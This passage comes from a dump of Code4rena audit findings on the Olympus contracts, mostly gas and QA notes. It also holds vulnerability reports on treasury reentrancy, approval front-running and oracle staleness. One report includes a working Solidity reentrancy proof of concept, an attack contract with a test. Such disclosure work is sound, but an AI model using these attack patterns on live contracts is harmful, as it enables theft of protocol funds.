[Operator.sol#L418](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L418) [Operator.sol#L426](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L426) [Operator.sol#L427](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L427) [Operator.sol#L430](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L430) [Operator.sol#L485](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L485) [Operator.sol#L665](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L665) [IOperator.sol#L13](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L13) [IOperator.sol#L14](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L14) [IOperator.sol#L15](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L15) [IOperator.sol#L16](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L16) [IOperator.sol#L17](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L17) [IOperator.sol#L18](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L18) [IOperator.sol#L19](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L19) [IOperator.sol#L20](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L20) [IOperator.sol#L31](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L31) [IOperator.sol#L32](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L32) [IOperator.sol#L33](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L33)  ## [G09] Initialize variables with default values are not needed ### Description If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address\ufffd). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  ### Lines in the code  [Kernel.sol#L397](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L397) [KernelUtils.sol#L43](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L43) [KernelUtils.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L58)  Assuming than uint's less than 256 are updated to uint256. [Operator.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L127) [Operator.sol#L129](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L129) [Operator.sol#403](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L403) [Operator.sol#455](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L455)  ## [G10] Using bools for storage incurs overhead ### Description Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from 'false' to 'true', after having been 'true' in the past  ### Lines in the code [Kernel.sol#L113](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L113) [Kernel.sol#L181](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L181) [Kernel.sol#L194](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L194) [Kernel.sol#L197](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L197) [RANGE.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L44) [PRICE.sol#L62](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L62) [Operator.sol#L63](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L63) [Operator.sol#L66](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L66) [Operator.sol#L735](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L735) [BondCallback.sol#L24](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L24) [Heart.sol#L33](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Heart.sol#L33) [Governance.sol#L105](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L105) [Governance.sol#L117](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L117) [IOperator.sol#L34](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L34)  ## [G11] Multiplication/division by two should use bit shifting ### Description <x> * 2 is equivalent to <x> << 1 and <x> / 2 is the same as <x> >> 1.  The MUL and DIV opcodes cost 5 gas, whereas SHL and SHR only cost 3 gas  ### Proof of concept ```solidity contract TestDiv2 {  function TestDivBy2 () public returns (uint256){   uint256 i = 4;   i = i / 2;   return i;  } }  contract TestDivShift {  function TestDivByShift () public returns (uint256){   uint256 i = 4;   i = i >> 1;   return i;  } } ``` - Transaction cost of TestDiv2 is 21581 gas - Transaction cost of TestDivShift is 21409 gas  - After the test it's possible to **save 172 gas with this optimization** per ocurrence.  ### Lines in the code [Opera"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/435", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "1. Use External than Public for saving more gas  Files :   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L34  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L37  2. Use Unchecked i++ for saving more gas  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L48-L49  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L63-L64  3. Saving gas by removing ` = 0`  This implementation code can be saving more gas by removing = 0, it because If a variable was not set/initialized, it is assumed to have default value to 0  Files :  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L253-L255 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L285-L287  4. Set value as immutable   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L28-L31  5.  change `uint256 i = 0` into `uint256 i` for saving more gas  using this implementation can saving more gas for each loops.  Files :   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L43 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L58"}, {"title": "Treasury module is vulnerable to cross-contract reentrancy", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/426", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L108-L112   # Vulnerability details  ## Impact An attacker can pay back their loan to the treasury module with protocol-owned tokens. This will cause their loan to decrease despite the protocol won't be given funds for it.  ## Proof of Concept The code first measures the number of tokens in the treasury, then transfers an amount to the contract and checks the change it caused. This is put behind a nonReentrant modifier so that one can't use the same balance change to pay back multiple parts of (potentially) multiple loans.  The problem arises when the treasury doesn't only claim tokens from paying back loans, but also claims protocol revenue. Since, an attacker can gain execution in the moment the funds are pulled to the treasury to trigger any function that grants treasury this type of tokens (collects protocol revenue). The contract will count these tokens as paying back one's loan since this happened between balance measurements.  ## Recommended Mitigation Steps Add a function used to pull a token to the contract and mark it nonReentrant. Any transfer of tokens to the treasury should be done through that function."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/425", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "[NC - 01] - Typo https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L126  Line 126 `Price.sol` numbe -> number  [NC - 02] - Left TODO https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L657  `Operator.sol` line 657 "}, {"title": "low market bonds/swaps not working after loan is taken from treasury", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/422", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L60   # Vulnerability details  ## Impact low market bonds/swaps not working after loan is taken from TRSRY  I am bordering between this being medium and low, but since this is, granted under very unlikely circumstances, is hindering intended transfers to work I am submitting it as medium. That said, I don't think this scenario is very likely since it requires a trusted contract not part of initial release(? no contract in repo used a loan) to take a large loan from TRSRY.  ## Proof of Concept this will cause test to fail on TRANSFER_FAILED due to TRSRY not having the tokens to transfer but `getReserveBalance` says it has, since capacity is determined based on non-existing tokens.  ```diff diff --git a/src/test/policies/Operator.t.sol b/src/test/policies/Operator.t.sol index e09aec1..5c1e95f 100644 --- a/src/test/policies/Operator.t.sol +++ b/src/test/policies/Operator.t.sol @@ -26,6 +26,8 @@ import {OlympusMinter, OHM} from \"modules/MINTR.sol\";  import {Operator} from \"policies/Operator.sol\";  import {BondCallback} from \"policies/BondCallback.sol\";   +import {ModuleTestFixtureGenerator} from \"test/lib/ModuleTestFixtureGenerator.sol\"; +  contract MockOhm is ERC20 {      constructor(          string memory _name, @@ -45,6 +47,7 @@ contract MockOhm is ERC20 {  // solhint-disable-next-line max-states-count  contract OperatorTest is Test {      using FullMath for uint256; +    using ModuleTestFixtureGenerator for OlympusTreasury;        UserFactory public userCreator;      address internal alice; @@ -53,6 +56,9 @@ contract OperatorTest is Test {      address internal policy;      address internal heart;   +    address public debtor; +    address public godmode;  +      RolesAuthority internal auth;      BondAggregator internal aggregator;      BondFixedTermTeller internal teller; @@ -187,6 +193,18 @@ contract OperatorTest is Test {            reserve.mint(address(treasury), testReserve * 100);   +        debtor = treasury.generateFunctionFixture(treasury.getLoan.selector); +        godmode = treasury.generateGodmodeFixture(type(OlympusTreasury).name); +         +        kernel.executeAction(Actions.ActivatePolicy, godmode); +        kernel.executeAction(Actions.ActivatePolicy, debtor); +         +        vm.prank(godmode); +        treasury.setApprovalFor(debtor, reserve, testReserve * 100); + +        vm.prank(debtor); +        treasury.getLoan(reserve,testReserve*100); +          // Approve the operator and bond teller for the tokens to swap          vm.prank(alice);          ohm.approve(address(operator), testOhm * 20); ```  same is applicable for low market bonds since they are created based on the same capacity  ## Tools Used vs code + tests  ## Recommended Mitigation Steps determine capacity from actual tokens held by treasury."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/417", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "- `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables (`-` too)     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138 - Using `private` rather than `public` for constants, saves gas     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L124     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L127     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L130     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L133     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L137     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59    - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65 - `++i` costs less gas than `++i`, especially when it is used in for-loop     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L488    "}, {"title": "TRSRY: front-runnable `setApprovalFor`", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/410", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L64-L72 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L42-L48   # Vulnerability details  ## Impact  An attacker may be able to withdraw more than intended  ## Proof of Concept  Let's say the alice had approval of 100. Now the treasury custodian reduced the approval to 50. Alice could frontrun the `setApprovalFor` of 50, and withdraw 100 as it was before. Then withdraw 50 with the newly set approval. So the alice could withdraw 150.  ```solidity // modules/TRSRY.sol   63     /// @notice Sets approval for specific withdrawer addresses  64     function setApprovalFor(  65         address withdrawer_,  66         ERC20 token_,  67         uint256 amount_  68     ) external permissioned {  69         withdrawApproval[withdrawer_][token_] = amount_;  70  71         emit ApprovedForWithdrawal(withdrawer_, token_, amount_);  72     } ```  The `TreasuryCustodian` simply calls the `setApprovalFor` to grant Approval. ```solidity  41  42     function grantApproval(  43         address for_,  44         ERC20 token_,  45         uint256 amount_  46     ) external onlyRole(\"custodian\") {  47         TRSRY.setApprovalFor(for_, token_, amount_);  48     } ```   ## Tools Used  none  ## Recommended Mitigation Steps  Instead of setting the given amount, one can reduce from the current approval. By doing so, it checks whether the previous approval is spend.  <!-- zzzitron M06 -->    "}, {"title": "TRSRY: reenter from OlympusTreasury::repayLoan to Operator::swap", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/403", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L105-L112 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330   # Vulnerability details  ## Impact  One can repay loan to the treasury with the value from the Operator::swap  Condition:   - the reserve token in Operator has hook for sender (like ERC777)   - the debt is the same token as reserve  ## Proof of Concept   The below code snippet shows a part of proof of concept for reentrancy attack, which is based on `src/test/policies/Operator.t.sol`. The full test code can be found [here](https://gist.github.com/zzzitron/651e1451ac1ff21be8a72b502b26f7cb), and [git diff from the `Operator.t.sol`](https://gist.github.com/zzzitron/5b8ebe635ed1939f18a100c7940b4f11).  Let's say that the reserve token implements ERC777 with the hook for the sender [(see weird erc20)](https://github.com/d-xo/weird-erc20#reentrant-calls). If the attacker can take debt of the reserve currency for the attack contract `Reenterer`, the contract can call `OlympusTreasury::repayLoan` and in the middle of repay call `Operator::swap` function. The `swap` function will modify the reserve token balance of treasury and the amount the attacker swapped will be also be used for the `repayLoan`.  In the below example, the attacker has debt of 1e18, and repays 1e17. But since the `swap` function is called in the `repayLoan`, the debt is reduced 1e17 more then it should. And the swap happened as expected so the attack has the corresponding ohm token.  ```solidity /// Mock to simulate the senders hook /// for simplicity omitted the certain aspects like ERC1820 registry and etc. contract MockERC777 is MockERC20 {     constructor () MockERC20(\"ERC777\", \"777\", 18) {}      function transferFrom(address from, address to, uint256 amount) public override returns (bool) {         _callTokenToSend(from, to, amount);         return super.transferFrom(from, to, amount);         // _callTokenReceived(from, to, amount);     }      // simplified implementation for ERC777     function _callTokenToSend(address from, address to, uint256 amount) private {       if (from != address(0)) {         IERC777Sender(from).tokensToSend(from, to, amount);       }     } }  interface IERC777Sender {   function tokensToSend(address from, address to, uint256 amount) external; }  /// Concept for an attack contract contract Reenterer is IERC777Sender {   ERC20 public token;   Operator public operator;   bool public entered;    constructor(address token_, Operator op_) {     token = ERC20(token_);     operator = op_;   }    function tokensToSend(address from, address to, uint256 amount) external override {     if (!entered) {     // call swap from reenter     // which will manipulate the balance of treasury       entered = true;       operator.swap(token, 1e17, 0);     }   }      function attack(OlympusTreasury treasury) public {     // approve to the treasury     token.approve(address(treasury), 1e18);     token.approve(address(operator), 100* 1e18);      // repayDebt of 1e17     treasury.repayLoan(token, 1e17);   } } ```  ```solidity /// the test     function test_poc__reenter() public {         vm.prank(guardian);         operator.initialize();        reserve.mint(address(reenterer), 1e18);       assertEq(treasury.reserveDebt(reserve, address(reenterer)), 1e18);       // start repayLoan       reenterer.attack(treasury);       // it should be 9 * 1e17 but it is 8 * 1e17       assertEq(treasury.reserveDebt(reserve, address(reenterer)), 8*1e17);     } ```  ## Cause  The `repayLoan`, in the line 110 below,  calls the `safeTransferFrom`. The balance before and after are compared to determine how much of debt is paid. So, if the `safeTranferFrom` can modify the balance, the attacker can profit from it.  ```solidity // OlympusTreasury::repayLoan // https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L105-L112 105     function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant { 106         if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding(); 107 108         // Deposit from caller first (to handle nonstandard token transfers) 109         uint256 prevBalance = token_.balanceOf(address(this)); 110         token_.safeTransferFrom(msg.sender, address(this), amount_); 111 112         uint256 received = token_.balanceOf(address(this)) - prevBalance; ```  In the `swap` function, if the amount in token is reserve, the payment token to buy ohm will be paid to the treasury. It gives to an opportunity to modify the balance.  ```solidity // Operator::swap // https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330 329             /// Transfer reserves to treasury 330             reserve.safeTransferFrom(msg.sender, address(TRSRY), amountIn_); ```  Although both of `Operator::swap` and `OlympusTreasury::repayLoan` have `nonReentrant` modifier, it does not prevent as they are two different contracts.  ## Tools Used  foundry  ## Recommended Mitigation Steps  The deposit logic in the `OlympusTreasury::repayLoan` was trying to handle nonstandard tokens, such as fee-on-transfer. But by doing so introduced an attack vector for tokens with ERC777. If the reserve token should be decided in the governance, it should be clarified, which token standards can be used safely.   <!-- zzzitron M00 -->    "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/401", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": " ## <X> += <Y> COSTS MORE GAS THAN <x> = <X> + <Y> FOR STATE VARIABLES https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L194 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L198 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L252 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L254 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L143 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L144 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L222 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138   ## FOR LOOPS CAN BE MORE EFFICIENT  To optimize the for loop and make it consume less gas, i suggest to:  1. If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address\u2026). Explicitly initializing it with its default value is an anti-pattern and wastes gas.   2. Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.  Caching the array length in the stack saves around 3 gas per iteration. I suggest storing the array\u2019s length in a variable before the for-loop.  https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L43 https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L58  ```for (uint256 i = 0; i < 32; ) {```  Actually this solution is already done in other contracts, so i suggest to change the line code above."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/398", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "1)It costs more gas to initialize variables to zero than to let the default of zero be applied  If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address\u2026). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  As an example: for (uint256 i = 0; i < numIterations; ++i) { should be replaced with for (uint256 i; i < numIterations; ++i) {      File: 2022-08-olympus\\src\\Kernel.sol   397,14:         for (uint256 i = 0; i < reqLength; ) {  File: 2022-08-olympus\\src\\utils\\KernelUtils.sol   43,10:     for (uint256 i = 0; i < 5; ) {   58,10:     for (uint256 i = 0; i < 32; ) {   2)<ARRAY>.LENGTH SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A FOR-LOOP The overheads outlined below are PER LOOP,   storage arrays incur a Gwarmaccess (100 gas) memory arrays use MLOAD (3 gas) calldata arrays use CALLDATALOAD (3 gas) Caching the length changes each of these to a DUP<N> (3 gas), and gets rid of the extra DUP<N> needed to store the stack offset     File: 2022-08-olympus\\src\\policies\\Governance.sol     278,47:         for (uint256 step; step < instructions.length; ) {   3)Using private rather than public for constants, saves gas  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  File: 2022-08-olympus\\src\\modules\\PRICE.sol   59,11:     uint8 public constant decimals = 18;     File: 2022-08-olympus\\src\\modules\\RANGE.sol   65,13:     uint256 public constant FACTOR_SCALE = 1e4;  File: 2022-08-olympus\\src\\policies\\Governance.sol   121,13:     uint256 public constant SUBMISSION_REQUIREMENT = 100;   124,13:     uint256 public constant ACTIVATION_DEADLINE = 2 weeks;   127,13:     uint256 public constant GRACE_PERIOD = 1 weeks;   130,13:     uint256 public constant ENDORSEMENT_THRESHOLD = 20;   133,13:     uint256 public constant EXECUTION_THRESHOLD = 33;   137,13:     uint256 public constant EXECUTION_TIMELOCK = 3 days;  File: 2022-08-olympus\\src\\policies\\Operator.sol   89,12:     uint32 public constant FACTOR_SCALE = 1e4;    4)X = X + Y IS CHEAPER THAN X += Y      File: 2022-08-olympus\\src\\modules\\PRICE.sol   136,28:             _movingAverage += (currentPrice - earliestPrice) / numObs;   222,19:             total += startObservations_[i];  File: 2022-08-olympus\\src\\modules\\TRSRY.sol   96,41:         reserveDebt[token_][msg.sender] += amount_;   97,27:         totalDebt[token_] += amount_;   131,50:         if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;  File: 2022-08-olympus\\src\\modules\\VOTES.sol   58,28:             balanceOf[to_] += amount_;  File: 2022-08-olympus\\src\\policies\\BondCallback.sol   143,35:         _amountsPerMarket[id_][0] += inputAmount_;   144,35:         _amountsPerMarket[id_][1] += outputAmount_;  File: 2022-08-olympus\\src\\policies\\Governance.sol   198,51:         totalEndorsementsForProposal[proposalId_] += userVotes;   252,60:             yesVotesForProposal[activeProposal.proposalId] += userVotes;   254,59:             noVotesForProposal[activeProposal.proposalId] += userVotes;  File: 2022-08-olympus\\src\\policies\\Heart.sol   103,18:         lastBeat += frequency();            "}, {"title": "Inconsistency in staleness checks between OHM and reserve token oracles", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/391", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L165-L171   # Vulnerability details  ## Impact Price oracle may fail and revert due to the inconsistency in the staleness checks.   ## Proof of Concept  In the `getCurrentPrice()` of `PRICE.sol`, Chainlink oracles are used to get the price of OHM against a reserve token, and a staleness check is used to make sure the price oracles are reporting fresh data. Yet the freshness requirements are inconsistent, for OHM, `updatedAt` should be lower than current timestamp minus three times the observation frequency, while for the reserve price, it is required that `updatedAt` should be lower than current timestamp minus the observation frequency. Our understanding is that that frequency is multiplied by 3 so that there can be some meaningful room where price data is accepted, as the time frame of only observation frequency (multiplied by 1) may not be enough for the oracle to realistically update its data.  (In other words, the frequency of new price information might be lower than the observation frequency, which is probably the case as third multiple is used for the OHM price).  If this is the case, this inconsistency may lead to the `getCurrentPrice()` reverting as while third multiple of the observation frequency might give enough space for the first oracle, second oracle's first multiple of frequency time frame might not be enough and it couldn't pass the staleness check due to unrealistic expectation of freshness.   ## Tools Used Manual review, talking with devs  ## Recommended Mitigation Steps Change the line 171 to  ```             if (updatedAt < block.timestamp - 3 * uint256(observationFrequency)) ``` like line 165. "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/387", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Low Risk and Non-Critical Issues  ## Low Risk ##  ### [L-01]: Missing check ###  **Context:**  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L79  **Description:**  Missing check that observationFrequency_ not equal to zero.  For example, there is a check that observationFrequency_ not equal to zero [here](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L268).   Constructor will not indicate Price_InvalidParams() error without that check.  **Recommendation:**  Change to:   ``` if (observationFrequency_ == 0 || movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency_ != 0) ```  ## Non-Critical Issues ##  ### [N-01]: Constants instead of unknown variables ### **Context:**   + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L43 (5)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L58 (32)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L90 (38)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L245 (10000)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L246 (100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L247 (10000)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L248 (100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L264 (10000 and 100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L164 (10000)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L217 (100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L268 (100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L106 (10_000)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L111 (10000 and 100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L518 (10000 and 100)  + https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L535 (10_000)  + 